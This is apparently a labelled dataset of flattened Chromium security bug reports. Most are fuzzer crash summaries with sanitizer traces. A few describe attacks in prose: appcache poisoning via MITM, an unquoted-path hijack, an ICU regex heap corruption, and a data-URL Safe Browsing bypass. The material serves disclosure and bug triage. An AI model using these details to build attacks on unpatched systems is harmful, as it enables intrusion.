fa 00 00 fa fa 04 fa fa fa 04 fa fa fa fd fa fa fa 01 fa fa fa 00 00 fa fa 00 fa fa fa 00 00 fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fd fa fa fd fa fa fa 04 fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 container overflow fc asan internal fe 16515==aborting version chrome version latest asan build of pdfium_test reproduction case attached in repro.pdf	7
use-of-uninitialized-value in unsigned int blink widthiterator advanceinternal blink surrogatepairawaretextiterator detailed report fuzzer miaubiz_svg_fuzzer job type linux_msan_chrome crash type use-of-uninitialized-value crash address crash state unsigned int blink widthiterator advanceinternal blink surrogatepairawar blink widthiterator advance blink font getglyphsandadvancesforsimpletext minimized testcase 3.00 kb filer inferno	11
do not cache resources retrieved via broken https in appcache or service worker vulnerability details for the site over https with an invalid certificate e.g self-signed and domain mismatch chrome may cache the resources e.g pages over broken https in html5 appcache if the site contains appcache manifest if the user is under an mitm attack in a public area e.g airport the attacker can replace the site s page with a malicious one that contains a long-lived e.g one year appcache manifest once the user clicks through an ssl warning when the user returns to a safe place without under mitm attacks and visits the same site chrome will directly load the malicious page in appcache instead of issuing new requests until the long-lived manifest expires version chrome version 37.0.2062.120 stable previous versions may have the same problem operating system os x 10.9.3 reproduction case 0 suppose the targeted site is the attacker hosts a malicious server and site and the victim is under a mitm attack the attacker can utilize a host of well-known mitm techniques e.g arp poisoning and dns pharming attacks to re-route all the traffic of the victim to himself in our experiment we use mitmproxy to simulate the attack 1 when the user visits the attacker intercepts the connection 2 once the user clicks through the ssl warning raised by chrome the attacker can substitute the malicious page for the original one the malicious one contains a long-lived appcache manifest 3 chrome caches the malicious copy in appcache for a long time when the user visits again in a safe place his chrome will directly load the malicious copy from appcache to simply demonstrate the caching scenario 1 download the attached test.html and test.appcache 2 host the two files on the local server that enables https with self-signed certificate 3 using chrome visit test.html and click through the ssl warnings 4 check chrome appcache-internals and chrome will show that test.html is cached in appcache in all chrome caches hijacked resources over https in appcache in the mitm scenario the attached picture yahoo1 is the malicious copy in appcache and the appcache-internals is the screenshot to show that chrome caches replaces page over broken https in appcache at present chrome does not cache resources over broken https connections which is desirable for security however html5 appcache resources over broken https connections should not be cached as well and such security restriction has already been implemented in safari	5
chrome s uninstaller launches ie w an unquoted path to iexplore.exe this is no good since a binary dropped at c program.exe for example would be run instead of ie	9
tracking bug for internal fixes chrome m40 release 0 critical high medium low	9
heap-use-after-free in vp9_setup_mask detailed report fuzzer inferno_flicker job type linux_asan_chrome_media crash type heap-use-after-free read 4 crash address crash state vp9_setup_mask vp9_loop_filter_rows vp9_loop_filter_worker unminimized testcase filer inferno	11
assertion failed to m_run.length unknown in blink harfbuzzshaper setdrawrange detailed report fuzzer bj_broddelwerk job type linux_asan_chrome_v8_arm crash type unknown crash address crash state blink harfbuzzshaper setdrawrange blink font buildglyphbuffer blink font drawtext regressed minimized testcase 47.32 kb filer inferno	11
use-of-uninitialized-value in vp3_h_loop_filter_c detailed report fuzzer inferno_flicker job type linux_msan_chrome crash type use-of-uninitialized-value crash address crash state vp3_h_loop_filter_c apply_loop_filter vp3_decode_frame minimized testcase 10007.21 kb filer inferno	11
tracking bug for internal fixes chrome m40 release 0 critical high medium low	11
heap-use-after-free in cfx_basesegmentedarray iterate detailed report uploader mjurczyk google.com job type linux_asan_pdfium crash type heap-use-after-free read 8 crash address crash state cfx_basesegmentedarray iterate cfx_cmapbytestringtoptr lookup cpdf_dictionary getdict minimized testcase 90.98 kb filer mjurczyk	11
bad-cast to blink rendertable from blink renderblockflow rendertable.h:366:1 detailed report fuzzer marty_html_twiddler job type linux_ubsan_vptr_chrome crash type bad-cast crash address crash state bad-cast to blink rendertable from blink renderblockflow rendertable.h:366:1 minimized testcase 22.94 kb filer inferno	11
security tracking bug for ffmpeg h.264 fixes hey there are several ffmpeg h.264 fixes for bugs found by afl-fuzz that we should probably pull in soonish 1 bad-looking use-after-free accessing an attacker-controlled ptr 2 read from a bad address that s only partly attacker-controlled may be not exploitable maybe easier on 32 bit 3 int overflow probably just leading to a boring dos before anything else can happen	11
heap-use-after-free in rdft_calc_c detailed report fuzzer mbarbella_js_mutation_layout job type linux_asan_content_shell_drt crash type heap-use-after-free read 4 crash address crash state rdft_calc_c blink fftframe dofft blink fftconvolver process regressed minimized testcase 5.65 kb filer inferno	11
heap-buffer-overflow in opj_tcd_init_decode_tile detailed report uploader mjurczyk google.com job type linux_asan_pdfium crash type heap-buffer-overflow write 4 crash address crash state opj_tcd_init_decode_tile opj_j2k_read_tile_header opj_j2k_decode_tiles unminimized testcase filer mjurczyk	11
memory access bug in harfbuzz when a carefully crafted font is fed fuzzing harfbuzz found an overflow bug what behdad wrote my assessment convinced me that this bug with a carefully constructed font can cause invalid memory-access in both firefox and chrome cc'ing firefox and chrome colleagues he has a one line fix and i ll apply it to chrome s copy of harfbuzz behdad can you give more information so that chrome s security team determine whether or not to cherry pick the change for release branches m39 m40 or m4 01	11
heap-use-after-free in blink frameview schedulerelayout detailed report fuzzer taviso_swf_api_fuzz job type linux_asan_chrome_mp crash type heap-use-after-free read 8 crash address crash state blink frameview schedulerelayout blink frameview create blink localframe createview regressed minimized testcase 10.36 kb additional requirements requires gestures filer aarya	11
assertion failed m_hasbadparent heap-use-after-free in webcore inlinebox nextleafchild detailed report fuzzer bj_broddelwerk job type linux_asan_chrome_mp crash type heap-use-after-free read 8 crash address crash state crash stack webcore inlinebox prevleafchild webcore position getinlineboxandoffset free stack webcore rootinlinebox destroy webcore renderlineboxlist deletelineboxes regressed minimized testcase 9.07 kb	11
use-after-free in blink treescope compareposition detailed report fuzzer inferno_twister job type windows_syzyasan_content_shell crash type use-after-free read 4 crash address crash state blink treescope compareposition blink styleengine inserttreescopeindocumentorder blink styleengine addstylesheetcandidatenode regressed minimized testcase 13.14 kb filer inferno	11
heap-buffer-overflow in opj_t1_decode_cblks detailed report uploader mjurczyk google.com job type linux_asan_pdfium crash type heap-buffer-overflow write 4 crash address crash state opj_t1_decode_cblks opj_tcd_decode_tile opj_j2k_decode_tile unminimized testcase filer mjurczyk	11
heap-buffer-overflow in cpdf_labcs getdefaultvalue detailed report uploader mjurczyk google.com job type linux_asan_pdfium crash type heap-buffer-overflow read 4 crash address crash state cpdf_labcs getdefaultvalue cpdf_dibsource getdecodeandmaskarray cpdf_dibsource createdecoder unminimized testcase filer mjurczyk	11
unknown in avio_read detailed report fuzzer inferno_flicker job type linux_asan_chrome_media crash type unknown crash address crash state avio_read append_packet_chunked mov_read_packet minimized testcase 911.67 kb additional requirements requires http filer mbarbella	11
heap-use-after-free in net clientcertstorenss getclientcertsonworkerthread detailed report fuzzer inferno_twister job type windows_asan_content_shell crash type heap-use-after-free read 4 crash address crash state base messageloop posttask net certverifierworker finish net certverifierworker run unminimized testcase additional requirements requires http filer inferno	11
heap-use-after-free in content indexeddbdatabase runversionchangetransaction detailed report fuzzer ipc_fuzzer_gen job type linux_asan_chrome_ipc crash type heap-use-after-free read 8 crash address crash state content indexeddbdatabase runversionchangetransaction content indexeddbdatabase openconnection content indexeddbdatabase processpendingcalls regressed minimized testcase 414.52 kb filer inferno	11
chromoting host must call closeclipboard with anonymous access token see bug 440693 for a related issue in chrome starting with windows 8 a new win32k system call was added which allows a process to open the access token of the last caller to the closeclipboard api because chromoting host calls closeclipboard from a system process it should call impersonateanonymoustoken before calling closeclipboard otherwise it s possible for any process to impersonate system access token	11
uninit memory access in cld2 inside translate determinepagelanguage linux aura r244798 run chrome under valgrind e.g tools/valgrind/valgrind.sh out/debug/chrome no-sandbox 19315 use of uninitialised value of size 8 19315 at cld2 utf8genericreplaceinternal cld2 utf8statemachineobj const stringpiece const stringpiece bool int int int cld2 offsetmap utf8statetable.cc:681 19315 by cld2 utf8genericreplace cld2 utf8statemachineobj const stringpiece const stringpiece bool int int int cld2 offsetmap utf8statetable.cc:1183 19315 by cld2 scriptscanner lowerscriptspan cld2 langspan getonescriptspan.cc:1050 19315 by cld2 scriptscanner getonescriptspanlower cld2 langspan getonescriptspan.cc:1065 19315 by cld2 detectlanguagesummaryv2 char const int bool cld2 cldhints const bool int cld2 language cld2 language int double std debug vector cld2 resultchunk std allocator cld2 resultchunk int bool compact_lang_det_impl.cc:1706 19315 by cld2 detectlanguagesummary char const int bool cld2 language int int bool compact_lang_det.cc:106 19315 by anonymous namespace determinetextlanguage std basic_string unsigned short base string16_char_traits std allocator unsigned short const bool language_detection_util.cc:118 19315 by translate determinepagelanguage std string const std string const std basic_string unsigned short base string16_char_traits std allocator unsigned short const std string bool language_detection_util.cc:205 19315 by translatehelper pagecaptured int std basic_string unsigned short base string16_char_traits std allocator unsigned short const translate_helper.cc:107 19315 by chromerenderviewobserver capturepageinfo int bool chrome_render_view_observer.cc:505 19315 by base internal runnableadapter void chromerenderviewobserver int bool run chromerenderviewobserver int const bool const bind_internal.h:248	11
assertion failed m_deletionhasbegun detailed report fuzzer inferno_layout_test_fuzzer job type linux_asan_chrome_mp crash type assert crash address crash state assertion failed m_deletionhasbegun blink node remove blink elementv8internal removemethodcallback regressed minimized testcase 23.58 kb additional requirements requires http filer inferno	11
heap-use-after-free in blink persistentbase blink threadlocalpersistents detailed report fuzzer taviso_swf_api_fuzz job type linux_asan_chrome_mp crash type heap-use-after-free write 8 crash address crash state blink persistentbase blink threadlocalpersistents blink webgeolocationpermissionrequestmanager reset content geolocationdispatcher geolocationdispatcher unminimized testcase additional requirements requires gestures filer inferno	11
heap-use-after-free in content mediastreamtrackmetricsobserver sendlifetimemessages detailed report fuzzer phoglund_webrtc_peerconnection job type linux_asan_chrome_mp crash type heap-use-after-free read 8 crash address crash state content mediastreamtrackmetricsobserver sendlifetimemessages content mediastreamtrackmetrics iceconnectionchange content rtcpeerconnectionhandler oniceconnectionchange unminimized testcase additional requirements requires http filer inferno	11
heap-buffer-overflow in icu_52 regexmatcher matchchunkat this template is only for reporting security bugs please use a different template for other types of bug reports please see the following link for instructions on filing security bugs vulnerability details integer overflow issue in icu regex engine urx_build icu/source/i18n/regeximp.h define urx_build type val int32_t type 24 val val is expected to be a 24-bit integer and can overflow into type if it can be larger issues occur in regexcompile doparseactions in a large proportion of instructions and as a result of the compiled pattern size the frame size or the data size being larger than two examples with regexes to trigger the issue 1 3 triggers the issue in doopencaptureparen fixliterals frxpat fcompiledpat addelement urx_build urx_nop 0 fstatus int32_t varsloc frxpat fframesize reserve three slots in match stack frame frxpat fframesize 3 int32_t cop urx_build urx_start_capture varsloc here frxpat fcompiledpat addelement cop fstatus frxpat fcompiledpat addelement urx_build urx_nop 0 fstatus 2 heap underflow after converting urx_sto_sp to urx_ld_sp a 0 b this will compile to the following bytecode index binary type operand 0 06000002 state_save 2 1 0d000003 jmp 3 2 0e000000 fail 3 21000000 ld_sp 0 this should be sto_sp 4 03000042 onechar b 5 06000007 state_save 7 6 0d000004 jmp 4 7 21000000 ld_sp 0 8 02000000 end if this is matched against the string bcd this will result in the following calculation inputidx=0 inputchar=42 sp 0 activelimit=3 0 06000002 state_save 2 inputidx=0 inputchar=42 sp 5 activelimit=3 1 0d000003 jmp 3 inputidx=0 inputchar=42 sp 5 activelimit=3 3 21000000 ld_sp 0 re 37889 malloc error for object pointer being freed was not allocated this has triggered a heap underflow in urx_ld_sp case urx_ld_sp u_assert opvalue 0 opvalue fpattern fdatasize int32_t newstacksize int32_t fdata opvalue u_assert newstacksize fstack size int64_t newfp fstack getbuffer newstacksize fframesize newstacksize 0 if newfp int64_t fp break int32_t i for i=0 i fframesize i newfp i int64_t fp i heap corruption fp restackframe newfp fstack setsize newstacksize break this regex engine is accessible through websql the attached poc probably triggers the issue in chrome x64 builds it will oom on 32-bit platforms will validate bug has been notified upstream this bug is subject to a 90 day disclosure deadline if 90 days elapse without a broadly available patch then the bug report will automatically become visible to the public version chrome version x.x.x.x stable beta or dev operating system please indicate os version and service pack level reproduction case please include a demonstration of the security bug such as an attached html or binary file that reproduces the bug when loaded in chrome please make the file as small as possible and remove any content not required to demonstrate the bug for crashes please include the following additional information type of crash tab browser etc crash state see link above stack trace registers exception record client id if relevant see link above	11
security circumvent safe browsing with data urls the data url scheme is not checked by chrome s safebrowsing enhanced download protection so could be used to bypass safebrowsing by crafting a data url for whatever binary you want this is similar to issue 431187 but for data urls	11
security uaf in cfx_dibsource getwidth vulnerability details 50==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 chrome 0 in cfx_dibsource getwidth const usr/local/google/tsepez/b1/src/out_asan/release third_party/pdfium/fpdfsdk/src include core/include/fpdfapi fxge/fx_dib.h:149:9 1 in cfx_renderdevice initdeviceinfo usr/local/google/tsepez/b1/src/out_asan/release third_party/pdfium/core/src/fxge/ge/fx_ge_device.cpp:30:15 2 in cfx_fxgedevice attach cfx_dibitmap int int cfx_dibitmap int usr/local/google/tsepez/b1/src/out_asan/release third_party/pdfium/core/src/fxge/agg/src agg23/fx_agg_driver.cpp:1604:5 3 in fpdf_renderpagebitmap_start usr/local/google/tsepez/b1/src/out_asan/release third_party/pdfium/fpdfsdk/src/fpdf_progressive.cpp:48:3 4 in chrome_pdf pdfiumengine continuepaint int pp imagedata usr/local/google/tsepez/b1/src/out_asan/release pdf/pdfium/pdfium_engine.cc:2449:10 5 in chrome_pdf pdfiumengine paint pp rect const pp imagedata std 1 vector pp rect std 1 allocator pp rect std 1 vector pp rect std 1 allocator pp rect usr/local/google/tsepez/b1/src/out_asan/release pdf/pdfium/pdfium_engine.cc:763:11 6 in chrome_pdf instance onpaint std 1 vector pp rect std 1 allocator pp rect const std 1 vector paintmanager readyrect std 1 allocator paintmanager readyrect std 1 vector pp rect std 1 allocator pp rect usr/local/google/tsepez/b1/src/out_asan/release pdf/instance.cc:822:7 7 in paintmanager dopaint usr/local/google/tsepez/b1/src/out_asan/release pdf/paint_manager.cc:201:3 8 in pp completioncallbackfactory paintmanager pp threadsafethreadtraits callbackdata pp completioncallbackfactory paintmanager pp threadsafethreadtraits dispatcher0 void paintmanager int thunk void int usr/local/google/tsepez/b1/src/out_asan/release ppapi/utility/completion_callback_factory.h:582:7 9 in void ppapi callwhileunlocked void pp_completioncallback int pp_completioncallback int void pp_completioncallback int pp_completioncallback const int const usr/local/google/tsepez/b1/src/out_asan/release ppapi/shared_impl/proxy_lock.h:134:10 10 in ppapi trackedcallback run int usr/local/google/tsepez/b1/src/out_asan/release ppapi/shared_impl/tracked_callback.cc:148:5 11 in base internal invokehelper false void base internal runnableadapter void ppapi proxy graphics2dresource ppapi proxy resourcemessagereplyparams const void ppapi proxy graphics2dresource const ppapi proxy resourcemessagereplyparams const makeitso base internal runnableadapter void ppapi proxy graphics2dresource ppapi proxy resourcemessagereplyparams const ppapi proxy graphics2dresource const ppapi proxy resourcemessagereplyparams const usr/local/google/tsepez/b1/src/out_asan/release base/bind_internal.h:898:5 12 in ppapi proxy pluginresource onreplyreceived ppapi proxy resourcemessagereplyparams const ipc message const usr/local/google/tsepez/b1/src/out_asan/release ppapi/proxy/plugin_resource.cc:54:5 13 in content pepperinprocessrouter onpluginmsgreceived ipc message const usr/local/google/tsepez/b1/src/out_asan/release content/renderer/pepper/pepper_in_process_router.cc:99:5 14 in base internal invokehelper true void base internal runnableadapter void content pepperinprocessrouter ipc message void base weakptr content pepperinprocessrouter const ipc message makeitso base internal runnableadapter void content pepperinprocessrouter ipc message base weakptr content pepperinprocessrouter const ipc message usr/local/google/tsepez/b1/src/out_asan/release base/bind_internal.h:909:5 15 in base internal invoker 2 base internal bindstate base internal runnableadapter void content pepperinprocessrouter ipc message void content pepperinprocessrouter ipc message void base weakptr content pepperinprocessrouter base internal ownedwrapper ipc message void content pepperinprocessrouter ipc message run base internal bindstatebase usr/local/google/tsepez/b1/src/out_asan/release base/bind_internal.h:1248:12 16 in base debug taskannotator runtask char const char const base pendingtask const usr/local/google/tsepez/b1/src/out_asan/release base/debug/task_annotator.cc:62:3 17 in base messageloop runtask base pendingtask const usr/local/google/tsepez/b1/src/out_asan/release base/message_loop/message_loop.cc:446:3 18 in base messageloop deferorrunpendingtask base pendingtask const usr/local/google/tsepez/b1/src/out_asan/release base/message_loop/message_loop.cc:456:5 19 in base messageloop dowork usr/local/google/tsepez/b1/src/out_asan/release base/message_loop/message_loop.cc:565:13 20 in base messagepumpdefault run base messagepump delegate usr/local/google/tsepez/b1/src/out_asan/release base/message_loop/message_pump_default.cc:32:21 21 in base runloop run usr/local/google/tsepez/b1/src/out_asan/release base/run_loop.cc:54:3 22 in base messageloop run usr/local/google/tsepez/b1/src/out_asan/release base/message_loop/message_loop.cc:308:3 23 in content renderermain content mainfunctionparams const usr/local/google/tsepez/b1/src/out_asan/release content/renderer/renderer_main.cc:235:7 24 in content runzygote content mainfunctionparams const content contentmaindelegate usr/local/google/tsepez/b1/src/out_asan/release content/app/content_main_runner.cc:344:14 25 in content contentmainrunnerimpl run usr/local/google/tsepez/b1/src/out_asan/release content/app/content_main_runner.cc:769:12 26 in content contentmain content contentmainparams const usr/local/google/tsepez/b1/src/out_asan/release content/app/content_main.cc:19:15 27 in chromemain usr/local/google/tsepez/b1/src/out_asan/release chrome/app/chrome_main.cc:57:12 28 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287:0 29 in start 0:0 is located 16 bytes inside of 64-byte region freed by thread t0 chrome here 0 in interceptor_free 0:0 1 in chrome_pdf pdfiumengine cancelpaints usr/local/google/tsepez/b1/src/out_asan/release pdf/pdfium/pdfium_engine.cc:2489:5 2 in chrome_pdf pdfiumengine scrolledtoyposition int usr/local/google/tsepez/b1/src/out_asan/release pdf/pdfium/pdfium_engine.cc:709:3 3 in chrome_pdf instance scrollbarvaluechanged pp scrollbar_dev unsigned int usr/local/google/tsepez/b1/src/out_asan/release pdf/instance.cc:698:5 4 in pp anonymous namespace scrollbar_valuechanged int int unsigned int usr/local/google/tsepez/b1/src/out_asan/release ppapi/cpp/dev/widget_client_dev.cc:50:10 5 in blink scrollablearea setscrolloffset blink doublepoint const usr/local/google/tsepez/b1/src/out_asan/release third_party/webkit/source/platform/scroll/scrollablearea.h:272:9 6 in blink scrollablearea scrollpositionchanged blink doublepoint const usr/local/google/tsepez/b1/src/out_asan/release third_party/webkit/source/platform/scroll/scrollablearea.cpp:195:5 7 in blink scrollanimator notifypositionchanged usr/local/google/tsepez/b1/src/out_asan/release third_party/webkit/source/platform/scroll/scrollanimator.cpp:136:5 8 in blink scrollablearea scrolltooffsetwithoutanimation blink scrollbarorientation float usr/local/google/tsepez/b1/src/out_asan/release third_party/webkit/source/platform/scroll/scrollablearea.cpp:173:9 9 in blink scrollbar movethumb int bool usr/local/google/tsepez/b1/src/out_asan/release third_party/webkit/source/platform/scroll/scrollbar.cpp:313:9 10 in blink scrollbar mousemoved blink platformmouseevent const usr/local/google/tsepez/b1/src/out_asan/release third_party/webkit/source/platform/scroll/scrollbar.cpp:392:13 11 in blink webpluginscrollbarimpl onmousemove blink webinputevent const usr/local/google/tsepez/b1/src/out_asan/release third_party/webkit/source/web/webpluginscrollbarimpl.cpp:305:9 12 in blink webpluginscrollbarimpl handleinputevent blink webinputevent const usr/local/google/tsepez/b1/src/out_asan/release third_party/webkit/source/web/webpluginscrollbarimpl.cpp:244:16 13 in content ppb_scrollbar_impl handleeventinternal ppapi inputeventdata const usr/local/google/tsepez/b1/src/out_asan/release content/renderer/pepper/ppb_scrollbar_impl.cc:148:22 14 in content ppb_widget_impl handleevent int usr/local/google/tsepez/b1/src/out_asan/release content/renderer/pepper/ppb_widget_impl.cc:46:10 15 in ppapi thunk anonymous namespace handleevent int int usr/local/google/tsepez/b1/src/out_asan/release ppapi/thunk/ppb_widget_dev_thunk.cc:40:10 16 in pp widget_dev handleevent pp inputevent const usr/local/google/tsepez/b1/src/out_asan/release ppapi/cpp/dev/widget_dev.cc:51:22 17 in chrome_pdf instance handleinputevent pp inputevent const usr/local/google/tsepez/b1/src/out_asan/release pdf/instance.cc:547:29 18 in pp inputevent_handleevent int int usr/local/google/tsepez/b1/src/out_asan/release ppapi/cpp/module.cc:53:22 19 in content pepperplugininstanceimpl handleinputevent blink webinputevent const blink webcursorinfo usr/local/google/tsepez/b1/src/out_asan/release content/renderer/pepper/pepper_plugin_instance_impl.cc:1183:25 20 in content pepperwebpluginimpl handleinputevent blink webinputevent const blink webcursorinfo usr/local/google/tsepez/b1/src/out_asan/release content/renderer/pepper/pepper_webplugin_impl.cc:187:10 21 in blink webplugincontainerimpl handlemouseevent blink mouseevent usr/local/google/tsepez/b1/src/out_asan/release third_party/webkit/source/web/webplugincontainerimpl.cpp:774:9 22 in blink webplugincontainerimpl handleevent blink event usr/local/google/tsepez/b1/src/out_asan/release third_party/webkit/source/web/webplugincontainerimpl.cpp:183:9 23 in blink htmlpluginelement defaulteventhandler blink event usr/local/google/tsepez/b1/src/out_asan/release third_party/webkit/source/core/html/htmlpluginelement.cpp:376:5 24 in blink eventdispatcher dispatcheventpostprocess void usr/local/google/tsepez/b1/src/out_asan/release third_party/webkit/source/core/events/eventdispatcher.cpp:212:9 25 in blink eventdispatcher dispatch usr/local/google/tsepez/b1/src/out_asan/release third_party/webkit/source/core/events/eventdispatcher.cpp:129:5 26 in blink mouseeventdispatchmediator dispatchevent blink eventdispatcher const usr/local/google/tsepez/b1/src/out_asan/release third_party/webkit/source/core/events/mouseevent.cpp:264:5 27 in blink eventdispatcher dispatchevent blink node wtf passrefptr blink eventdispatchmediator usr/local/google/tsepez/b1/src/out_asan/release third_party/webkit/source/core/events/eventdispatcher.cpp:50:12 28 in blink node dispatchmouseevent blink platformmouseevent const wtf atomicstring const int blink node usr/local/google/tsepez/b1/src/out_asan/release third_party/webkit/source/core/dom/node.cpp:2103:12 29 in blink webviewimpl handleinputevent blink webinputevent const usr/local/google/tsepez/b1/src/out_asan/release third_party/webkit/source/web/webviewimpl.cpp:2107:9 previously allocated by thread t0 chrome here 0 in interceptor_malloc 0:0 1 in fpdfbitmap_createex usr/local/google/tsepez/b1/src/out_asan/release third_party/pdfium/fpdfsdk/src/fpdfview.cpp:684:2 2 in chrome_pdf pdfiumengine createbitmap pp rect const pp imagedata const usr/local/google/tsepez/b1/src/out_asan/release pdf/pdfium/pdfium_engine.cc:2633:10 3 in chrome_pdf pdfiumengine continuepaint int pp imagedata usr/local/google/tsepez/b1/src/out_asan/release pdf/pdfium/pdfium_engine.cc:2442:53 4 in chrome_pdf pdfiumengine paint pp rect const pp imagedata std 1 vector pp rect std 1 allocator pp rect std 1 vector pp rect std 1 allocator pp rect usr/local/google/tsepez/b1/src/out_asan/release pdf/pdfium/pdfium_engine.cc:763:11 5 in chrome_pdf instance onpaint std 1 vector pp rect std 1 allocator pp rect const std 1 vector paintmanager readyrect std 1 allocator paintmanager readyrect std 1 vector pp rect std 1 allocator pp rect usr/local/google/tsepez/b1/src/out_asan/release pdf/instance.cc:822:7 6 in paintmanager dopaint usr/local/google/tsepez/b1/src/out_asan/release pdf/paint_manager.cc:201:3 7 in pp completioncallbackfactory paintmanager pp threadsafethreadtraits callbackdata pp completioncallbackfactory paintmanager pp threadsafethreadtraits dispatcher0 void paintmanager int thunk void int usr/local/google/tsepez/b1/src/out_asan/release ppapi/utility/completion_callback_factory.h:582:7 8 in void ppapi callwhileunlocked void pp_completioncallback int pp_completioncallback int void pp_completioncallback int pp_completioncallback const int const usr/local/google/tsepez/b1/src/out_asan/release ppapi/shared_impl/proxy_lock.h:134:10 9 in ppapi trackedcallback run int usr/local/google/tsepez/b1/src/out_asan/release ppapi/shared_impl/tracked_callback.cc:148:5 10 in base internal invokehelper false void base internal runnableadapter void ppapi proxy graphics2dresource ppapi proxy resourcemessagereplyparams const void ppapi proxy graphics2dresource const ppapi proxy resourcemessagereplyparams const makeitso base internal runnableadapter void ppapi proxy graphics2dresource ppapi proxy resourcemessagereplyparams const ppapi proxy graphics2dresource const ppapi proxy resourcemessagereplyparams const usr/local/google/tsepez/b1/src/out_asan/release base/bind_internal.h:898:5 11 in ppapi proxy pluginresource onreplyreceived ppapi proxy resourcemessagereplyparams const ipc message const usr/local/google/tsepez/b1/src/out_asan/release ppapi/proxy/plugin_resource.cc:54:5 12 in content pepperinprocessrouter onpluginmsgreceived ipc message const usr/local/google/tsepez/b1/src/out_asan/release content/renderer/pepper/pepper_in_process_router.cc:99:5 13 in base internal invokehelper true void base internal runnableadapter void content pepperinprocessrouter ipc message void base weakptr content pepperinprocessrouter const ipc message makeitso base internal runnableadapter void content pepperinprocessrouter ipc message base weakptr content pepperinprocessrouter const ipc message usr/local/google/tsepez/b1/src/out_asan/release base/bind_internal.h:909:5 14 in base internal invoker 2 base internal bindstate base internal runnableadapter void content pepperinprocessrouter ipc message void content pepperinprocessrouter ipc message void base weakptr content pepperinprocessrouter base internal ownedwrapper ipc message void content pepperinprocessrouter ipc message run base internal bindstatebase usr/local/google/tsepez/b1/src/out_asan/release base/bind_internal.h:1248:12 15 in base debug taskannotator runtask char const char const base pendingtask const usr/local/google/tsepez/b1/src/out_asan/release base/debug/task_annotator.cc:62:3 16 in base messageloop runtask base pendingtask const usr/local/google/tsepez/b1/src/out_asan/release base/message_loop/message_loop.cc:446:3 17 in base messageloop deferorrunpendingtask base pendingtask const usr/local/google/tsepez/b1/src/out_asan/release base/message_loop/message_loop.cc:456:5 18 in base messageloop dowork usr/local/google/tsepez/b1/src/out_asan/release base/message_loop/message_loop.cc:565:13 19 in base messagepumpdefault run base messagepump delegate usr/local/google/tsepez/b1/src/out_asan/release base/message_loop/message_pump_default.cc:32:21 20 in base runloop run usr/local/google/tsepez/b1/src/out_asan/release base/run_loop.cc:54:3 21 in base messageloop run usr/local/google/tsepez/b1/src/out_asan/release base/message_loop/message_loop.cc:308:3 22 in content renderermain content mainfunctionparams const usr/local/google/tsepez/b1/src/out_asan/release content/renderer/renderer_main.cc:235:7 23 in content runzygote content mainfunctionparams const content contentmaindelegate usr/local/google/tsepez/b1/src/out_asan/release content/app/content_main_runner.cc:344:14 24 in content contentmainrunnerimpl run usr/local/google/tsepez/b1/src/out_asan/release content/app/content_main_runner.cc:769:12 25 in content contentmain content contentmainparams const usr/local/google/tsepez/b1/src/out_asan/release content/app/content_main.cc:19:15 26 in chromemain usr/local/google/tsepez/b1/src/out_asan/release chrome/app/chrome_main.cc:57:12 27 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287:0 summary addresssanitizer heap-use-after-free 0 shadow bytes around the buggy address fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa 00 00 00 00 00 00 00 fa fa fa fa fa 00 00 00 00 00 00 04 fa fa fa fa fa 00 00 00 00 00 00 00 fa fa fa fa fa 00 00 00 00 00 00 00 04 fa fa fa fa 00 00 00 00 00 00 00 fa fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 container overflow fc array cookie ac asan internal fe 50==aborting version chrome version chromium 40.0.2191.0 linux built from tot 2014-10-15 reproduction case opening the attached pdf which is a previous cf test case dismissing the alert box twice scrolling down til the alert box appears again and dismissing the alert box triggers the crash	11
heap-use-after-free in blink datetimeeditelement datetimeeditelement vulnerability details please provide a brief explanation of the security issue version chrome version stable beta asan-win32-release-311003 operating system windows 7 enterprise sp1 reproduction case open the attached 20107_min.html file under asan build and follow the stack trace for crashes please include the following additional information type of crash tab crash state 5416==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 0 in blink datetimeeditelement valueasdatetimefieldsstate c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\html\shadow\datetimeeditelement.cpp:810 1 in blink basemultiplefieldsdateandtimeinputtype saveformcontrolstate c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\html\forms\basemultiplefieldsdateandtimeinputtype.cpp:486 2 in blink htmlinputelement saveformcontrolstate c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\html\htmlinputelement.cpp:540 3 in blink documentstate tostatevector c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\html\forms\formcontroller.cpp:432 4 in blink historyitem documentstate c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\loader\historyitem.cpp:158 5 in blink webhistoryitem documentstate c b\build\slave\win_asan_release\build\src\third_party\webkit\source\web\webhistoryitem.cpp:130 6 in content singlehistoryitemtopagestate c b\build\slave\win_asan_release\build\src\content\renderer\history_serialization.cc:100 7 in content historyentrytopagestate c b\build\slave\win_asan_release\build\src\content\renderer\history_serialization.cc:121 8 in content historyentrytopagestate c b\build\slave\win_asan_release\build\src\content\renderer\history_serialization.cc:178 9 in content renderviewimpl sendupdatestate c b\build\slave\win_asan_release\build\src\content\renderer\render_view_impl.cc:1487 10 in content renderviewimpl syncnavigationstate c b\build\slave\win_asan_release\build\src\content\renderer\render_view_impl.cc:2526 11 in base internal invoker 1 base internal bindstate base internal runnableadapter void thiscall content renderviewimpl void void cdecl content renderviewimpl void cdecl base internal unretainedwrapper content renderviewim 12 in base 